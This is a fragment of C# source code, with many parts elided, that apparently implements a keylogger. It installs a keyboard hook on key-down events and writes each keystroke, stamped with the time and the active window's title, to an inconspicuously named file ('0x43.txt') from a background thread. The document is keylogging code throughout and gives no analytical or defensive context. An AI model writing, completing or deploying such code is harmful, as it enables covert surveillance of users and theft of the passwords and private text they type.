...
namespace SWK
{
    ...
    {
        public static readonly string LoggerPath = Program.DataPath + @"\0x43.txt";
        private static string CurrentActiveWindowTitle;
        private static Thread LoggerProcess = new Thread(Start);
        ...
        {
            //if (LoggerProcess.ThreadState == System.Threading.ThreadState.Running)
            //{
            //    #pragma warning disable CS0618
            //    LoggerProcess.Suspend();
            //}
            LoggerProcess.Abort();
            ...
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                ...
                using (StreamWriter sw = new StreamWriter(LoggerPath, true))
                {
                    ...
                    else
                    {
                        ...
                        sw.WriteLine("Time: " +  DateTime.Now.ToString("ss.mm.HH.dd.MM.yyyy") + " ###  " + GetActiveWindowTitle() + " ###");
                        sw.Write(currentKey);
                    }
                }
            }
